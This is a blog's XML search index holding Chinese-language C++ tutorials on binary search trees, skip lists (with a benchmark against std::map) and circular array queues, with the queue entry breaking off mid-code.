<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[数据结构-二叉查找树(BST)]]></title>
    <url>%2Fbst-cpp%2F</url>
    <content type="text"><![CDATA[在计算机科学中，树是一种非线性数据结构，树的种类有大致分为两类:无序树和有序树。有序树又分为二叉查找树、堆、左高树、AVL树、红黑树等。树是一种非常重要的数据结构，如C++ STL中的map底层实现原理是红黑树，Java (jdk1.8) HashMap更是采用了散列表+链表+红黑树。不过在讨论二叉查找树之前，我们需要了解树的一些基本知识。 树一棵树t是一个非空的有限个元素的集合，其中一个元素为根(root)，若其余元素存在，则组成t的子树 如下图图3为仅有一个元素的树，且该元素为树的根(root) 关于树的术语(摘自维基百科)节点的度：一个节点含有的子树的个数称为该节点的度树的度：一棵树中，最大的节点度称为树的度叶节点或终端节点：度为零的节点，也就是没有节点的节点非终端节点或分支节点：度不为零的节点父亲节点或父节点：若一个节点含有子节点，则这个节点称为其子节点的父节点孩子节点或子节点：一个节点含有的子树的根节点称为该节点的子节点兄弟节点：具有相同父节点的节点互称为兄弟节点节点的层次：从根开始定义起，根为第1层，根的子节点为第2层，以此类推深度：对于任意节点n,n的深度为从根到n的唯一路径长，根的深度为0高度：对于任意节点n,n的高度为从n到叶子节点的最长路径长，所有树叶的高度为0堂兄弟节点：父节点在同一层的节点互为堂兄弟节点的祖先：从根到该节点所经分支上的所有节点子孙：以某节点为根的子树中任一节点都称为该节点的子孙森林：由m（m&gt;=0）棵互不相交的树的集合称为森林 高度和深度的区别其实不用太在意，不同的人有不同的定义。若有兴趣可以去stackoverflow What is the difference between tree depth and height? 看看 二叉树定义：一棵二叉树(binary tree) t 是有限个元素的集合(可以为空)。当二叉树非空时，其中一个元素称为根，若存在其余元素，则分为两颗二叉树，分别称为 t 的左子树和右子树 二叉树中每个元素的左子树和右子树是有序的，而树的子树是无序的 性质二叉树的性质有很多，这里仅列举其中的一些。 性质1：一棵二叉树有$n$个元素，$n&gt;0$，它有$n-1$条边性质2：一棵二叉树的高度为$h$，$h\ge0$，它最少有$h$个元素，最多有$2^h-1$个元素性质3：一棵二叉树有$n$个元素，$n&gt;0$，它的高度最大为$n$，最小高度为$\lceil log_2(n+1) \rceil$。性质4：设完全二叉树其中一个元素编号$i，1 \le i \le n$，则: 若$i=1$，则该元素为二叉树的根。若$i&gt;1$，则其父节点的编号为 $\lfloor \frac{i}{2} \rfloor$ 若$2i&gt;n$，则该元素无左孩子。否则，其左孩子编号$2i$ 若$2i+1&gt;n$，则该元素无右孩子。否则，其右孩子编号$2i+1$ 当高度为$h$的二叉树恰好有$2^h-1$个元素时，称为满二叉树。 完全二叉树可以看作是满二叉树删除最底层最右边的元素后形成的一棵树。满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 二叉树描述二叉树描述既可以数组也可以用链表。其中用数组描述的一般是二叉堆，用链表描述的比较常用，适用范围广。因此本文主要是基于链表描述的二叉查找树来展开 二叉查找树(Binary Search Tree)二叉查找树也可叫做二叉搜索树，其满足以下特征: 每个元素有唯一的一个关键字 左子树的元素的关键字小于 根节点的关键字 右子树的元素的关键字大于 根节点的关键字 根节点的左右子树也是二叉查找树 定义一个bst节点结构 12345678template&lt;typename T&gt;struct NodeEntry&#123; int key; // 关键字 T data; // 数据域 NodeEntry *parent; // 父节点 NodeEntry *left_nodes; // 左子树 NodeEntry *right_nodes; // 右子树&#125;; bst模板类 12345678910111213141516171819202122232425262728293031323334template&lt;typename T&gt;class binaryTree&#123;public: typedef T value_type; typedef T&amp; reference_type; typedef const T&amp; const_reference_type; typedef const int&amp; const_key_type; typedef NodeEntry&lt;T&gt; NODE; typedef NodeEntry&lt;T&gt;&amp; REF_NODE; typedef NodeEntry&lt;T&gt;* PNODE; typedef NodeEntry&lt;T&gt;* &amp; REF_PNODE;private: PNODE m_NodeRoot;public: binaryTree(); binaryTree(const_key_type k,const_reference_type v); ~binaryTree(); int Height(PNODE pNode); bool Insert(REF_PNODE pNode,PNODE pNodeParent,const_key_type key,const_reference_type value); bool Delete(PNODE pNode,const_key_type key); NodeEntry&lt;T&gt;* Search(PNODE pNode,const_key_type key); void ClearAll(REF_PNODE pNode); NodeEntry&lt;T&gt;* predecessor(NODE* pNode); NodeEntry&lt;T&gt;* successor(NODE* pNode); void PreOrder(NODE * pRootNode); void InOrder(NODE * pRootNode); void PostOrder(NODE * pRootNode); void LevelOrder(NODE * pRootNode);&#125;; 遍历bst有三种遍历方式 前序遍历 中序遍历 后序遍历 层级遍历 前序遍历先访问当前节点，然后再遍历左子树，最后遍历右子树 123456789template&lt;typename T&gt;void binaryTree&lt;T&gt;::PreOrder(binaryTree::NODE *pRootNode) &#123; if(pRootNode== nullptr)&#123; return; &#125; cout&lt;&lt;pRootNode-&gt;key&lt;&lt;endl; PreOrder(pRootNode-&gt;left_nodes); PreOrder(pRootNode-&gt;right_nodes);&#125; 中序遍历先遍历左子树，再访问当前节点，最后遍历右子树 123456789template&lt;typename T&gt;void binaryTree&lt;T&gt;::InOrder(binaryTree::NODE *pRootNode) &#123; if(pRootNode == nullptr)&#123; return; &#125; InOrder(pRootNode-&gt;left_nodes); cout&lt;&lt;pRootNode-&gt;key&lt;&lt;endl; InOrder(pRootNode-&gt;right_nodes);&#125; 可见中序遍历能够有序输出节点 后序遍历先遍历左子树，再遍历右子树，最后访问当前节点 12345678void binaryTree&lt;T&gt;::PostOrder(binaryTree::NODE *pRootNode) &#123; if(pRootNode== nullptr)&#123; return; &#125; PostOrder(pRootNode-&gt;left_nodes); PostOrder(pRootNode-&gt;right_nodes); cout&lt;&lt;pRootNode-&gt;key&lt;&lt;endl;&#125; 层级遍历主要是利用广度优先搜索实现的 1234567891011121314151617181920template&lt;typename T&gt;void binaryTree&lt;T&gt;::LevelOrder(binaryTree::NODE *pRootNode) &#123; if(!pRootNode)return; queue&lt;binaryTree::PNODE&gt;q; q.push(pRootNode); while (!q.empty())&#123; binaryTree::PNODE pNode=q.front(); cout&lt;&lt;pNode-&gt;key&lt;&lt;endl; // 左子树存在，先处理左边 if(pNode-&gt;left_nodes)&#123; q.push(pNode-&gt;left_nodes); &#125; // 右子树存在，在处理右边 if(pNode-&gt;right_nodes) &#123; q.push(pNode-&gt;right_nodes); &#125; // 处理下一个节点 q.pop(); &#125;&#125; 高度12345678template&lt;typename T&gt;int binaryTree&lt;T&gt;::Height(binaryTree::PNODE pNode) &#123; if(!pNode)return 0; int h1=Height(pNode-&gt;left_nodes); int h2=Height(pNode-&gt;right_nodes); // 高度从0开始计数，因此高度要加1 return std::max(h1,h2)+1;&#125; 查找bst查找类似二分查找。很简单 1234567891011121314template&lt;typename T&gt;NodeEntry&lt;T&gt; *binaryTree&lt;T&gt;::Search(PNODE pNode,const_key_type key) &#123; if(!pNode)return nullptr; if(pNode-&gt;key==key)&#123; return pNode; &#125;else if(key&lt;pNode-&gt;key)&#123; //left return Search(pNode-&gt;left_nodes,key); &#125;else if(key&gt;pNode-&gt;key)&#123; //right return Search(pNode-&gt;right_nodes,key); &#125; return nullptr;&#125; 前驱/后继节点要完成bst的删除操作，那么就必须要知道前驱/后继节点怎么找。前驱节点： 假设存在一个节点N，那么它的前驱节点就是关键字小于N的且最大的节点。即$key[max(predecessor)]&lt;key[N]$ 后继节点： 假设存在一个节点N，那么它的后继节点就是关键字大于N的且最小的节点。即$key[min(successor)]&gt;key[N]$ 根据前驱节点定义查找： 若节点N有左子树L：且左子树L的右子树存在，则依次遍历L的右子树直到叶子节点，就是前驱节点；否则该左子树L就是前驱节点 若节点N无左子树，但节点N是其父节点P的右孩子，那么父节点P就是该节点N的前驱结点 若节点N无左子树，但该节点N是其父节点P的左孩子，那么需要沿着父亲节点P一直向树的顶端寻找，直到找到一个节点X是其父节点M的右孩子，则节点M为前驱节点 以上三种情况分别对应下图 后继节点查找类似前驱节点 若节点N有右子树R：且右子树R的左子树存在，则依次遍历R的左子树直到叶子节点，就是后继节点；否则该右子树R就是后继节点 若节点N无右子树，但节点N是其父节点P的左孩子，那么父节点P就是该节点N的后继结点 若节点N无右子树，但该节点N是其父节点P的右孩子，那么需要沿着父亲节点P一直向树的顶端寻找，直到找到一个节点X是其父节点M的左孩子，则节点M为后继节点 代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354template&lt;typename T&gt;NodeEntry&lt;T&gt;* binaryTree&lt;T&gt;::predecessor(NODE* pNode)&#123; if(!pNode)return nullptr; // 如果存在左子树 if (pNode-&gt;left_nodes)&#123; auto x=pNode-&gt;left_nodes; while (x-&gt;right_nodes)&#123; x=x-&gt;right_nodes; &#125; return x; &#125;else if(pNode-&gt;parent)&#123; // 该节点为父节点的右孩子 if (pNode-&gt;parent-&gt;right_nodes==pNode)&#123; return pNode-&gt;parent; &#125;else&#123; // 该节点为父节点的左孩子 NodeEntry&lt;T&gt;* parent=pNode-&gt;parent; // 向父节点方向遍历 while (parent &amp;&amp; parent-&gt;left_nodes==pNode)&#123; pNode=parent; parent=parent-&gt;parent; &#125; return parent; &#125; &#125; return nullptr;&#125;template&lt;typename T&gt;NodeEntry&lt;T&gt;* binaryTree&lt;T&gt;::successor(NODE* pNode)&#123; if(!pNode)return nullptr; // 如果存在右子树 if (pNode-&gt;right_nodes)&#123; auto x=pNode-&gt;right_nodes; while (x-&gt;left_nodes)&#123; x=x-&gt;left_nodes; &#125; return x; // 右子树不存在 &#125;else if(pNode-&gt;parent)&#123; if (pNode-&gt;parent-&gt;left_nodes==pNode)&#123; return pNode-&gt;parent; &#125;else&#123; NodeEntry&lt;T&gt;* parent=pNode-&gt;parent; while (parent &amp;&amp; parent-&gt;right_nodes==pNode)&#123; pNode=parent; parent=parent-&gt;parent; &#125; return parent; &#125; &#125; return nullptr;&#125; 插入讲完前驱后继的查找后，接下来是插入操作，bst的插入比较简单，也就是在空节点nullptr处更新一个新节点，插入方法类似查找方法。插入操作要保证key的唯一性 12345678910111213141516171819202122232425template&lt;typename T&gt;bool binaryTree&lt;T&gt;::Insert(REF_PNODE pNode,PNODE pNodeParent,const_key_type key,const_reference_type value) &#123; // 表示当前为空节点 if(pNode == nullptr)&#123; // 新建一个待插入的节点 pNode=new NODE(); pNode-&gt;key=key; pNode-&gt;left_nodes= nullptr; pNode-&gt;right_nodes= nullptr; pNode-&gt;data=value; pNode-&gt;parent=pNodeParent; return true; &#125; else if(key &lt; pNode-&gt;key)&#123; return Insert(pNode-&gt;left_nodes,pNode,key,value); &#125; else if(key &gt; pNode-&gt;key)&#123; return Insert(pNode-&gt;right_nodes,pNode,key,value); &#125; // 已经存在了 else&#123; cout&lt;&lt;"Already exist!"&lt;&lt;endl; return false; &#125;&#125; 删除删除操作就有点复杂了，不过照着思路也很容易写出来。大致分为三类 删除叶子结点 删除只有一棵子树的节点 删除有两棵子树的节点 注意：删除操作一定要维护二叉查找树的性质！！！ 删除叶子结点，这类情况最为简单，找到待删除节点后直接delete，同时更新父子节点关系；删除有两棵子树的节点的操作可以转化为删除只有一棵子树的节点，转化策略有前驱和后继两种，本文删除节点使用的策略为后继法。 首先来看一下这个例子删除key=8的节点，不一定真的是删除该节点，不然的话还要重新建立父子节点关系以及维护bst的性质。因此，利用前驱/后继节点的方法可以巧妙的避开这些不必要的麻烦：只需要替换待删除节点和前驱/后继节点的数据，然后利用删除只有一棵子树的节点的方法来删除前驱/后继节点即可。 删除只有一棵子树的节点情况如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162template&lt;class T&gt;bool binaryTree&lt;T&gt;::Delete(PNODE pNode,const_key_type key) &#123; PNODE pDeletenode = this-&gt;Search(pNode,key); if(!pDeletenode) return false; // 节点的左右子树都存在情况下，此时将其转化为其他两种情况 if(pDeletenode-&gt;left_nodes!=nullptr&amp;&amp;pDeletenode-&gt;right_nodes!=nullptr)&#123; PNODE successor=this-&gt;successor(pDeletenode); // 只需要交换数据 pDeletenode-&gt;key=successor-&gt;key; pDeletenode-&gt;data=successor-&gt;data; // 标记pDeletenode为后继节点， pDeletenode=successor; &#125; // 是否有子节点 PNODE child=nullptr; /* 80 80 / \ 70[delete] 86[delete] \ \ 75 90 */ // 删除只有一棵子树的情况 // 判断待删除节点的子节点左右孩子 if(pDeletenode-&gt;left_nodes!=nullptr)&#123; child=pDeletenode-&gt;left_nodes; &#125;else&#123; child=pDeletenode-&gt;right_nodes; &#125; if(child!=nullptr)&#123; child-&gt;parent=pDeletenode-&gt;parent; &#125; /*情况1 情况2 情况3 情况4 9 9 9 9 / / / / 7 7 7[delete] 7[delete] / \ / \ 6[delete] 8[delete] 6 8情况5 情况6 情况7 情况8 1 1 1 1 \ \ \ \ 7 7 7[delete] 7[delete] / \ / \ 6[delete] 8[delete] 6 8 */ // 删除的是根节点 if(pDeletenode-&gt;parent==nullptr)&#123; m_NodeRoot=child; // 判断待删除节点是其父节点的左右孩子 &#125;else if(pDeletenode-&gt;parent-&gt;left_nodes==pDeletenode)&#123; pDeletenode-&gt;parent-&gt;left_nodes=child; &#125;else&#123; pDeletenode-&gt;parent-&gt;right_nodes=child; &#125; delete pDeletenode; pDeletenode=nullptr; return true;&#125; bst释放递归方式释放所有节点 12345678template&lt;typename T&gt;void binaryTree&lt;T&gt;::ClearAll(binaryTree::REF_PNODE pNode) &#123; if(!pNode)return; ClearAll(pNode-&gt;left_nodes); ClearAll(pNode-&gt;right_nodes); delete pNode; pNode= nullptr;&#125; ok，基本上bst大致讲完了，bye~]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>DataStructures</tag>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-跳跃表C++实现]]></title>
    <url>%2Fskiplist-cpp%2F</url>
    <content type="text"><![CDATA[跳跃表/跳表(SkipList)In computer science, a skip list is a data structure that allows $O(\log n)$ search complexity as well as $O(\log n)$ insertion complexity within an ordered sequence of $n$ elements. —— 维基百科 概述由于本人知识有限，对于跳跃表的认识可能不够深入，不过还是想把自己的看法写下来……初学跳跃表时也许无法理解，不过当深入理解了跳跃表的原理时，一切都变得easy。比起手写一个红黑树代码跳跃表要简单得多，而且跳跃表也有很多实现例子的，如 Qt中的 QMap ,MemSQL ,Redis… 虽然我都没有接触过… 跳跃表一个简单的跳跃表结构 我们都知道，对一个 有序链表 执行查找的复杂度为 $O(n)$ ,而对数组使用二分查找的复杂度则是 $O(\log n)$，而跳跃表的出现就是为了解决有序链表的查找问题(当然还要其他更重要的作用)，使其复杂度将为 $O(\log n)$ ，不过最坏情况下却仍是$O(n)$注意: 跳跃表适用于有序链表。 利用跳跃表之后的查找、插入、删除复杂度如下 方法 查找 插入 删除 平均情况 $O(\log n)$ $O(\log n)$ $O(\log n)$ 最坏情况 $O(n)$ $O(n)$ $O(n)$ 跳跃表是一个空间换时间的数据结构。 那么跳跃表是如何实现快速查找的呢？跳跃表通过建立 索引节点 ，每次查找时，先通过最顶层索引节点一层层的向下寻找满足条件的节点，每次查找都有可能跨越到其他不相邻的节点，直到抵达最底层也就是原始层链表某处节点位置。 这里的 索引节点 其实就是一组节点地址，在new一个新节点时就分配好，然后在对每一层索引节点进行重组，使其前后串联起来，这样就形成了一个 $i$级链表且 $i\in(0,M-1)$ M为跳跃表的最高层级数MaxLevel，这样每一层级均可形成一条链。 要查找key为5的节点，那么从head开始一层层的查找，此次过程跳过了节点1和节点3，最后找到了节点5。 这里我们设置一个有序链表为带有head和tail节点，其中head节点的next指针就是有序链表的起始，而tail节点一般为nullptr，不过这里我们将tail作为哨兵节点，这样就无需处理nullptr问题了。 插入/删除在一个规则跳表结构中，$i$级链表有 $\frac{n}{2^i}$ 个节点，$n$为最底层链表的总节点数。如:$0 \rightarrow i$ 层有 $n,\frac{n}{2},\frac{n}{4},\cdots,\frac{n}{2^{i}}$ 也就是说，我们希望在插入时符合这种结构，而插入的节点属于$i$级链表的概率为 $\frac{1}{2^i}$ (不难想出，插入节点属于0级链表概率永远为1，而属于1级链表的概率为$\frac{1}{2}$，$\cdots$，属于$i$级链表的为$\frac{1}{2^i}$) 这时来看看这段话，摘自William Pugh(就是他搞出了跳表)写的论文里的一段话。文末参考中有他关于跳表的论文 原文Skip lists are a data structure that can be used in place of balanced trees.Skip lists use probabilistic balancing rather than strictly enforced balancingand as a result the algorithms for insertion and deletion in skip lists aremuch simpler and significantly faster than equivalent algorithms forbalanced trees.翻译:跳跃表是一种可以用来代替平衡树的数据结构。跳跃表使用概率平衡而不是严格执行的平衡。因此，在跳跃表中插入和删除的算法是要比等效算法简单得多，也快得多平衡树。 注意 跳跃表使用概率平衡而不是严格执行的平衡 这告诉我们，插入操作是动态的插入到不同层级的位置。因此，把一个新节点插入到$i$级链表的概率为$p^i$ (在一个规则跳表结构中，$p=0.5$ )。 而这个动态插入法就利用到 随机数生成函数 来完成，一个好的随机数生成函数，能够使跳表结构达到最优的效果使其复杂度不会太高。 除此之外每一次插入/删除操作，都必须要维护跳表结构，也就是处理好链表节点的指向关系，避免混乱。 级的分配不说那么多，级的分配可以利用一个随机数生成函数来完成。伪码: 123456randomLevel() lvl := 1 -- random() that returns a random value in [0...1) while random() &lt; p and lvl &lt; MaxLevel do lvl := lvl + 1 return lvl 转化成C++代码 12345678int random_level()&#123; int level= 1; while (((double)(rand()%101)/101) &lt; (m_prob) &amp;&amp; level &lt; m_maxLevel) &#123; level++; &#125; return level;&#125; 这里还要一个糟糕的随机数生成函数仅供参考 1234int random_level()&#123; int level = rand() % m_maxLevel + 1; return level;&#125; C++实现跳跃表OK，现在开始用C++实现跳跃表首先我们定义两个结构体，用于保存节点数据 1234567891011121314151617181920template&lt;class KeyType,class ValueType&gt;struct Element&#123; KeyType key; ValueType value; Element()&#123;&#125; Element(KeyType key,const ValueType&amp; value)&#123; this-&gt;key=key; this-&gt;value=value; &#125;&#125;;template&lt;class KeyType,class ValueType&gt;struct skipNode&#123; Element&lt;KeyType,ValueType&gt; element; skipNode**next; skipNode(const Element&lt;KeyType,ValueType&gt;&amp;theElement,int size)&#123; this-&gt;element=theElement; this-&gt;next=new skipNode&lt;KeyType,ValueType&gt;*[size]; &#125;&#125;; 确定MaxLevelMaxLevel太大，造成空间的浪费，太小又会导致退化成一个冗杂的 ‘单链表’ 结构，两者均会影响跳跃表的性能。因此合适的MaxLevel十分重要。 从《Skip Lists: A Probabilistic Alternative toBalanced Trees》 中我们可以这样定义一个MaxLevel，即$L(n)=\lceil log_\frac{1}{p}n \rceil$$MaxLevel=L(N),N$为待插入元素节点总数 利用换底公式 $\log_ab=\frac{\log_cb}{\log_ca}$ 转化为C++代码 123int MaxLevel(int numberOfnode,float prob)&#123; return (int)(ceil(logf((float)numberOfnode)/logf((float)1/prob)));&#125; skiplist初始化我们只需在构造函数进行初始化即可。这里我们既可以自定义跳跃表的MaxLevel，也可以通过numberOfnode来计算一个MaxLevel 1234567891011121314151617181920212223242526template&lt;class KeyType,class ValueType&gt;skiplist&lt;KeyType,ValueType&gt;::skiplist(float prob,KeyType tailLargeKey,int max_level,int numberOfnode) &#123; srand(time(nullptr)); m_prob=prob; m_size=0; // 计算最大链表层数 if(numberOfnode!=-1) m_maxLevel=MaxLevel(numberOfnode,prob); else m_maxLevel=max_level; m_curMaxLevel=0; // 初始化尾节点 m_tailKey=tailLargeKey; Element&lt;KeyType,ValueType&gt;tailPair&#123;m_tailKey,0&#125;; m_tailNode=new skipNode&lt;KeyType,ValueType&gt;(tailPair,0); // 初始化头结点 m_headNode=new skipNode&lt;KeyType,ValueType&gt;(tailPair,m_maxLevel); for (int i = 0; i &lt; m_maxLevel; i++)&#123; m_headNode-&gt;next[i]=m_tailNode; &#125; m_forwardNodes=new skipNode&lt;KeyType,ValueType&gt;*[m_maxLevel];&#125; 尾节点内存分配类似malloc(0)形式 skiplist查找 find和search1234567891011121314151617181920212223242526272829303132template&lt;class KeyType,class ValueType&gt;skipNode&lt;KeyType,ValueType&gt;* skiplist&lt;KeyType,ValueType&gt;::search(const KeyType&amp;key)&#123; skipNode&lt;KeyType,ValueType&gt;*forwardNode=m_headNode; // 外层循环: 不断的指向下一层级链表 for (int i = m_curMaxLevel-1; i &gt;= 0; --i)&#123; // 内层循环: 指向当前层级链表的邻接节点 while (forwardNode-&gt;next[i]!=m_tailNode&amp;&amp;forwardNode-&gt;next[i]-&gt;element.key&lt;key)&#123; forwardNode=forwardNode-&gt;next[i]; &#125; // 保存前驱节点指针 this-&gt;m_forwardNodes[i]=forwardNode; &#125; return forwardNode-&gt;next[0];&#125;template&lt;class KeyType,class ValueType&gt;Element&lt;KeyType,ValueType&gt;* skiplist&lt;KeyType,ValueType&gt;::find(const KeyType&amp;key)&#123; if(key &gt; this-&gt;m_tailKey) return nullptr; skipNode&lt;KeyType,ValueType&gt;*forwardNode=m_headNode; for (int i = m_curMaxLevel-1; i &gt;=0 ; --i)&#123; while (forwardNode-&gt;next[i]!=m_tailNode &amp;&amp; forwardNode-&gt;next[i]-&gt;element.key &lt; key)&#123; forwardNode=forwardNode-&gt;next[i]; &#125; &#125; // 最终会遍历到第0层-&gt;原始层，只需要在第0层判断即可 if(forwardNode-&gt;next[0]-&gt;element.key==key)&#123; return &amp;forwardNode-&gt;next[0]-&gt;element; &#125;else&#123; return nullptr; &#125;&#125; 其中find和search都是从当前最大层级依次向下遍历，不同的是，search在遍历的同时将每次遍历到每一层的前驱节点保存在m_forwardNodes中，目的是为了衔接后面的插入/删除节点 其中的 forwardNode-&gt;next[0] 就是下一个要查找的节点(如果存在的话) skiplist插入每一次插入，需要通过search保存 前驱节点m_forwardNodes 从而将待插入节点连接起来。如下图红色箭头表示前后需要链接的节点 123456789101112131415161718192021222324template&lt;class KeyType,class ValueType&gt;void skiplist&lt;KeyType,ValueType&gt;::insert(const Element&lt;KeyType,ValueType&gt;&amp;element)&#123; // 随机生成索引节点层数 1&lt;=level&lt;=m_maxLevel int level=random_level(); if(level &gt; this-&gt;m_curMaxLevel)&#123; this-&gt;m_curMaxLevel=level; &#125; skipNode&lt;KeyType,ValueType&gt;*pNode=search(element.key); // 已经存在 if(pNode-&gt;element.key==element.key)&#123; pNode-&gt;element.value=element.value; return; &#125; // 此时已经保存了合适的前驱节点m_forwardNodes // 创建一个具有level层的节点 skipNode&lt;KeyType,ValueType&gt;*pNewNode = new skipNode&lt;KeyType,ValueType&gt;(element,level); // 建立索引节点 for (int i = level-1; i &gt;=0; --i)&#123; pNewNode-&gt;next[i]=m_forwardNodes[i]-&gt;next[i]; m_forwardNodes[i]-&gt;next[i]=pNewNode; &#125; m_size++;&#125; skiplist删除删除操作类似插入操作，也需要通过search保存 前驱节点m_forwardNodes 12345678910111213141516171819202122232425template&lt;class KeyType,class ValueType&gt;bool skiplist&lt;KeyType,ValueType&gt;::erase(const KeyType&amp;key)&#123; // 不符合的key if(key&gt;m_tailKey) return false; skipNode&lt;KeyType,ValueType&gt;*pNode=search(key); // 不存在 if(pNode-&gt;element.key!=key) return false; // 更新跳表链表结构 for (int i = m_curMaxLevel-1; i &gt;= 0; --i)&#123; // 此处 m_forwardNodes[i]-&gt;next[i] 可能不是 pNode if(m_forwardNodes[i]-&gt;next[i]==pNode) m_forwardNodes[i]-&gt;next[i]=pNode-&gt;next[i]; &#125; // 维护当前最大层级数 // 当删除一个具有最大层级的节点时，可能会导致 m_headNode-&gt;next[m_maxLevel-1]=m_tailNode，那么此时需要降低层级 while (m_curMaxLevel-1 &gt; 0&amp;&amp;m_headNode-&gt;next[m_curMaxLevel-1]==m_tailNode)&#123; m_curMaxLevel--; &#125; delete pNode; m_size--; return true;&#125; 需要注意的是，删除节点后还要维护m_curMaxLevel使其不能太高 释放跳跃表在析构函数中释放所有内存 12345678910template&lt;class KeyType,class ValueType&gt;skiplist&lt;KeyType,ValueType&gt;::~skiplist()&#123; while (m_headNode!=m_tailNode)&#123; auto x=m_headNode-&gt;next[0]; delete m_headNode; m_headNode=x; &#125; delete m_tailNode; delete []m_forwardNodes;&#125; 测试用skiplist和STL map测试插入操作，仅供参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;map&gt;#include &lt;iostream&gt;#include "skiplist.h"#include "ClockTest.h"using namespace std;// 一个无穷数#define TAIL_INFINITY_KEY 0xffffffint main(int argc, char const *argv[])&#123; int n=1000000; srand(time(nullptr)); // 测试skiplist insert CClock::start_timeclock(); skiplist&lt;int,int&gt; sk(0.5,TAIL_INFINITY_KEY,0,n); for (int i = n; i &gt;= 0; --i)&#123; sk.insert(Element&lt;int,int&gt;&#123;rand()%n,i&#125;); &#125; CClock::stop_timeclock(); auto skiplist_insert_time=CClock::time_duration(); // 测试map insert CClock::start_timeclock(); map&lt;int,int&gt; mp; for (int i = n; i &gt;=0; --i)&#123; mp.insert(pair&lt;int,int&gt;(rand()%n,i)); &#125; CClock::stop_timeclock(); auto map_insert_time=CClock::time_duration(); // 测试skiplist find CClock::start_timeclock(); for (int i = n; i &gt;=0; --i)&#123; sk.find(rand()%n); &#125; CClock::stop_timeclock(); auto skip_find_time=CClock::time_duration(); // 测试map find CClock::start_timeclock(); for (int i = n; i &gt;=0; --i)&#123; mp.find(rand()%n); &#125; CClock::stop_timeclock(); auto map_find_time=CClock::time_duration(); // 测试skiplist erase CClock::start_timeclock(); for (int i = n; i &gt;=0; --i)&#123; sk.erase(rand()%n); &#125; CClock::stop_timeclock(); auto skip_erase_time=CClock::time_duration(); // 测试map erase CClock::start_timeclock(); for (int i = n; i &gt;=0; --i)&#123; mp.erase(rand()%n); &#125; CClock::stop_timeclock(); auto map_erase_time=CClock::time_duration(); cout&lt;&lt;"SkipList insert time: "&lt;&lt;skiplist_insert_time&lt;&lt;endl; cout&lt;&lt;"SkipList find time: "&lt;&lt;skip_find_time&lt;&lt;endl; cout&lt;&lt;"SkipList erase time: "&lt;&lt;skip_erase_time&lt;&lt;endl; cout&lt;&lt;endl; cout&lt;&lt;"Map insert time: "&lt;&lt;map_insert_time&lt;&lt;endl; cout&lt;&lt;"Map find time: "&lt;&lt;map_find_time&lt;&lt;endl; cout&lt;&lt;"Map erase time: "&lt;&lt;map_erase_time&lt;&lt;endl; cout&lt;&lt;"SkipList size: "&lt;&lt;sk.size()&lt;&lt;endl; cout&lt;&lt;"Map size: "&lt;&lt;mp.size()&lt;&lt;endl; return 0;&#125; 我机器上测试 随机插入/查找/删除，结果仅供参考。单位秒 insert find erase skiplist1 1.44737 2.03802 2.158 skiplist2 1.34377 1.61364 1.52145 skiplist3 1.35671 2.31105 1.57659 map1 1.48519 1.28156 1.93228 map2 1.00754 1.099 1.29245 map3 1.23837 1.28021 1.35214 由此可见，跳跃表也是很高效的一种数据结构 skiplist源码地址: https://github.com/josexy/skiplist_c 参考维基百科-skiplistSkip Lists: A Probabilistic Alternative toBalanced Trees浅析SkipList跳跃表原理及代码实现]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>DataStructures</tag>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-队列]]></title>
    <url>%2Fqueue-cpp%2F</url>
    <content type="text"><![CDATA[队列是一种先进先出(FIFO)的数据结构，与栈(后进先出LIFO)不同，但两者都是线性结构，因此可以用线性表去描述队列，本文主要是用数组去实现一个简单的队列 队列对一个队列操作，只能从队首删除元素，队尾插入元素，因此我们可以定义两个队列元素指针front,back，用于跟踪队列首尾元素。C++ STL实现了队列数据结构，我们用时不可能立即手写一个队列，因而只需include头文件即可，不过对于队列这一数据结构原理还是要理解的 我们知道，队列可以用数组或链表实现，不过本文是以数组来讲述的因此较为简单 插入队列插入一个元素时，先将队尾指针back+1，使其指向下一个空闲区域，然后在插入元素。复杂度为O(1) 删除删除队首元素有两种策略 直接整个数组左移一位，front不变，back向前移动一位。复杂度O(n) 数组不移动，front移动到下一位，back不变。复杂度O(1) 显然删除操作情况1不能接受，然而对于删除操作情况2，会导致数组空间浪费，这是因为front指针之前的区域未能被利用，而back指针之后的区域显然不够(这里在没有考虑数组变增的情况下)。 如果将数组“串”起来怎样？事实上确实可以，这种数组叫环形数组，用此类型数组实现的队列称为循环队列 且其插入删除复杂度均为O(1) 环形数组表示队列通过下面公式实现: location(i)=(location(front)+i)%arrayLength 如下图一个空队列，此时 front=back 当插入一个元素时，也有两种策略 1.先移动back，后插入元素。那么front指向元素为”空”2.先插入元素，后移动back。那么back指向元素为”空” 每次插入都需要判断 (back+1)%size == front ，为什么？我们知道，初始时front=back表示空队列，那么当插入元素数量达到数组长度此时front=back！这表示这个队列满的还是空的？因此我们预留一个位置，也就是队列不能插满。即 front=back 空队列(back+1)%size = front 满队列 如何获取队列中第n个元素在数组中的下标？假设front=10，back=4。 因此我们用C++实现该循环队列 队列实现队列抽象数据类型 1234567891011template&lt;class T&gt;class QueueBase&#123;public: virtual ~QueueBase()&#123;&#125; virtual void push_back(const T &amp;)=0; virtual void pop_front()=0; virtual T &amp; front()=0; virtual T &amp; back()=0; virtual bool empty()=0; virtual int size()=0;&#125;; 之后在另外定义一个派生类继承QueueBase接口。我是按照策略2来插入元素的，代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091template&lt;class T&gt;class arrayQueue&#123;private: T *m_array; int m_capacity; int front; int back;public: arrayQueue(int initCapacity=10)&#123; m_capacity=initCapacity; m_array=new T[m_capacity]; front=0; back=0; &#125; ~arrayQueue()&#123;delete []m_array;&#125; void push_back(const T &amp;); void pop_front(); T &amp; Front()&#123; return m_array[front]; &#125; T &amp; Back()&#123; return m_array[back-1]; &#125; bool empty()&#123;return front==back;&#125; int size()&#123; if(front&lt;back) return back-front; else return back+m_capacity-front; &#125; void 